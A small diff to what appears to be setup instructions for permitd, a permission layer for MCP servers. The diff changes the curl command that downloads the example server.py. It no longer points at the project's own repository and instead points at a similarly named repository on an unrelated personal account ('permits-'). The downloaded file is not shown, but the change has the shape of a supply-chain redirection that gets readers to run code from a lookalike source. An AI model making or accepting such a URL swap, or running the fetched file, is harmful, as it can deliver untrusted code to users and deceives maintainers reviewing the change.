@@ -16,7 +16,7 @@ macOS with Python 3.14, mcp 2.1.1, permitd 0.2.0.
 mkdir permitd-demo && cd permitd-demo
 python3 -m venv venv && source venv/bin/activate
 pip install "permitd[mcp]"
-curl -sSLO https://raw.githubusercontent.com/hbar-systems/permitd/main/examples/mcp_server/server.py
+curl -sSLO https://raw.githubusercontent.com/gregorygerman777-hub/permits-/main/examples/mcp_server/server.py
 ```
 
 `server.py` is an MCP server with three tools: `read_notes` (GREEN, runs
